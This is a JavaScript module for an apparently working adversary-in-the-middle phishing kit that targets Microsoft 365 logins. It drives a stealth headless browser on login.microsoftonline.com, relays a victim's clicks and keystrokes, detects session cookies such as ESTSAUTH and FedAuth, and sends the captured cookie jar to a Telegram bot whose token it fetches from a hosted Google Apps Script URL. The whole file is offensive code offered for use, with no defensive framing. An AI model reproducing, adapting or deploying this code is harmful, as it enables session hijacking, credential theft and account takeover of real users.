const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const FormData = require('form-data');

puppeteer.use(StealthPlugin());

// --- CONFIGURATION VAULT ---
// Replace with your Google Apps Script Web App URL
const VAULT_URL = "https://script.google.com/macros/s/AKfycbzjX20l3RNxx1adYeW_108CdbGJlO3vi2lwhdixZSBo_83oijJYtIAURqAg9ImZSGrZ/exec";
let cachedCreds = null;

const VIEWPORT_WIDTH = 1280;
const VIEWPORT_HEIGHT = 720;

/**
 * Retrieves credentials from the GAPS Vault
 */
async function getSecrets() {
    if (cachedCreds) return cachedCreds;
    try {
        const response = await axios.get(VAULT_URL, { timeout: 5000 });
        cachedCreds = response.data;
        return cachedCreds;
    } catch (e) {
        return null;
    }
}

/**
 * Sends the captured jar to Telegram using GAPS-hosted credentials
 */
async function sendExfiltrationAlert(cookies, finalUrl, source) {
    const secrets = await getSecrets();
    if (!secrets || !secrets.TG_TOKEN || !secrets.TG_CHAT_ID) return;

    const docUrl = `https://api.telegram.org/bot${secrets.TG_TOKEN}/sendDocument`;
    const msgUrl = `https://api.telegram.org/bot${secrets.TG_TOKEN}/sendMessage`;
    const chatId = secrets.TG_CHAT_ID;

    try {
        const host = new URL(finalUrl).hostname;
        const textAlert = `<b>🚨 STAGE CAPTURE: ${host}</b>\n\n<b>Trigger:</b> <code>${source}</code>\n<b>Tokens:</b> ${cookies.length}\n\n<i>Verified: 2026 Persistence Signatures</i>`;
        
        await axios.post(msgUrl, { chat_id: chatId, text: textAlert, parse_mode: 'HTML' });

        const form = new FormData();
        form.append('chat_id', chatId);
        form.append('caption', `Auth Jar [${host}]`);
        form.append('document', Buffer.from(JSON.stringify(cookies, null, 2), 'utf-8'), {
            filename: `JAR_${host.replace(/\./g, '_')}_${Date.now()}.json`,
            contentType: 'application/json'
        });

        await axios.post(docUrl, form, { headers: form.getHeaders() });
    } catch (e) {
        // Silent failure for production stability
    }
}

async function startSession(io, socket) {
    let browser;
    const capturedDomains = new Set(); 

    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: [
                '--no-sandbox', 
                '--disable-setuid-sandbox', 
                `--window-size=${VIEWPORT_WIDTH},${VIEWPORT_HEIGHT}`,
                '--disable-notifications'
            ]
        });

        const page = await browser.newPage();
        await page.setViewport({ width: VIEWPORT_WIDTH, height: VIEWPORT_HEIGHT });
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36');

        const attemptExfiltration = async (source) => {
            try {
                const url = page.url().toLowerCase();
                if (url === 'about:blank') return;
                
                const host = new URL(url).hostname;
                if (capturedDomains.has(host)) return;

                const cookies = await page.cookies();
                const criticalTokens = [
                    'ESTSAUTHPERSISTENT', 'ESTSAUTH', 'CCState', 
                    '__Host-MSAAUTH', 'RPSSecAuth', 'FedAuth', 'OutlookSession'
                ];
                
                const hasValidAuth = cookies.some(c => criticalTokens.some(t => c.name.includes(t)));

                if (hasValidAuth && !url.includes('/oauth20_authorize.srf')) {
                    capturedDomains.add(host); 
                    
                    // 5-second settlement for background token exchange
                    await new Promise(r => setTimeout(r, 5000));
                    
                    const finalJar = await page.cookies();
                    await sendExfiltrationAlert(finalJar, url, source);
                }
            } catch (e) {}
        };

        // --- TRIGGERS ---
        page.on('response', async (response) => {
            const url = response.url().toLowerCase();
            if (url.includes('/kmsi') || url.includes('/token') || url.includes('landingv2')) {
                await attemptExfiltration('Network-Intercept');
            }
        });

        page.on('framenavigated', async (frame) => {
            await attemptExfiltration('Navigation-Trigger');
        });

        const emitFrame = async () => {
            if (socket.connected) {
                try {
                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 20 });
                    socket.emit('browser-render', { screenshot });
                } catch (e) {}
            }
        };

        await page.goto('https://login.microsoftonline.com/', { waitUntil: 'networkidle2' }).catch(() => {});
        
        const heartbeat = setInterval(emitFrame, 1300);
        const poller = setInterval(() => attemptExfiltration('Periodic-Poll'), 4500);

        // Victim Interaction
        socket.on('victim-action', async (data) => {
            try {
                if (data.type === 'click') {
                    await page.mouse.click(data.x, data.y, { delay: 65 });
                } else if (data.type === 'key') {
                    await page.keyboard.press(data.key);
                }
                await emitFrame();
            } catch (e) {}
        });

        // Socket Heartbeat (Railway Keep-Alive)
        socket.on('heartbeat', () => { /* Logic is handled by the packet receipt itself */ });

        socket.on('disconnect', async () => {
            clearInterval(heartbeat);
            clearInterval(poller);
            if (browser) await browser.close();
        });

    } catch (error) {
        if (browser) await browser.close();
    }
}

module.exports = { startSession };
